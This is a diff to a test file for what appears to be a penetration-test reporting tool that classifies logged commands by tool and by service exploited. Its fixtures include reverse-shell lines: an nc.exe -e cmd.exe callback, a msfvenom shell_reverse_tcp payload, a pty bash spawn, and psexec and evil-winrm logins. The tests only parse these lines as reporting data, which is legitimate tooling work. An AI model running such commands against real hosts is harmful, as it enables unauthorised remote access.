@@ -142,9 +142,21 @@ describe("toolsUsed", () => {
     ]);
     expect(toolsUsed(log, [H]).find((r) => r.tool === "mytool")).toEqual({ tool: "mytool", purpose: "", url: "" });
   });
-  it("counts python3 only when it runs a .py file, as the exploit runner", () => {
-    expect(toolsUsed([entry("a", "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\npython3 -m http.server 80")], [H])).toEqual([]);
+  it("counts python3 only when it runs a .py file, as the exploit runner, however the script is started", () => {
+    expect(toolsUsed([entry("a", "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\npython3 -m http.server 80\npython -m venv x")], [H])).toEqual([]);
     expect(toolsUsed([entry("a", "python3 46153.py -u admin -i http://x")], [H]).map((r) => [r.tool, r.purpose])).toEqual([["python3", "Exploit runner"]]);
+    expect(toolsUsed([entry("a", "./46153.py -u admin\n/opt/x/exploit.py")], [H]).map((r) => [r.tool, r.purpose])).toEqual([["python3", "Exploit runner"]]);
+    expect(toolsUsed([entry("a", "psexec.py a@b")], [H]).map((r) => r.tool)).toEqual(["impacket-psexec"]);
+  });
+  it("leaves out git and ssh-keygen and names msfconsole", () => {
+    expect(toolsUsed([entry("a", "git clone https://x/y\nssh-keygen -t ed25519\nmsfconsole -q")], [H])).toEqual([
+      { tool: "msfconsole", purpose: "Metasploit console", url: "https://github.com/rapid7/metasploit-framework" },
+    ]);
+  });
+  it("a cleared override field falls back to the catalog", () => {
+    expect(toolsUsed([entry("a", "nmap x")], [H], { overrides: { nmap: { purpose: "", url: "https://x" } } })).toEqual([
+      { tool: "nmap", purpose: "Port and service scanning", url: "https://x" },
+    ]);
   });
   it("leaves out entries an operator or private attempt points at, and applies per-row overrides", () => {
     const log = [entry("a", "PrintSpoofer32.exe -i"), entry("b", "hydra -l sa x")];
@@ -210,6 +222,31 @@ describe("serviceCoverage from access", () => {
     ] as never;
     expect(by(d, 445)).toMatchObject({ result: "exploited", via: "Pass the hash (psexec)" });
     expect(by(d, 8080)).toMatchObject({ result: "exploited", via: "Tomcat manager on 8080" });
+  });
+
+  it("never reads a listener or callback port in a linked command as the target's", () => {
+    const d = base();
+    d.services = [...d.services, svc(443, { nmapService: "https" }), svc(80, { nmapService: "http" })] as never;
+    d.log = [
+      cmdEntry("l1", "rlwrap nc -lvnp 443"),
+      cmdEntry("l2", 'nc.exe 192.0.2.10 80 -e cmd.exe\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=192.0.2.10 LPORT=443 -f exe'),
+      cmdEntry("l3", "evil-winrm -i 10.0.0.5 -u j -p x"),
+    ];
+    d.grants = [
+      { hostId: H, level: "user", via: "Reverse shell", logEntryId: "l1", at: 1 },
+      { hostId: H, level: "system", via: "Service binary swap", logEntryId: "l2", at: 2 },
+      { hostId: H, level: "user", via: "Provided credentials", logEntryId: "l3", at: 3 },
+    ] as never;
+    expect(by(d, 443).result).toBe("untested");
+    expect(by(d, 80).result).toBe("untested");
+    expect(by(d, 5985)).toMatchObject({ result: "exploited", via: "Provided credentials" });
+  });
+
+  it("reads a port named in the linked entry's title", () => {
+    const d = base();
+    d.log = [cmdEntry("l1", "curl -s http://10.0.0.5:8080/manager", { title: "Tomcat manager upload on 8080" })];
+    d.grants = [{ hostId: H, level: "user", via: "WAR upload", logEntryId: "l1", at: 1 }] as never;
+    expect(by(d, 8080)).toMatchObject({ result: "exploited", via: "WAR upload" });
   });
 
   it("ignores a private linked entry, other hosts' grants, and lets a finding and an override win", () => {
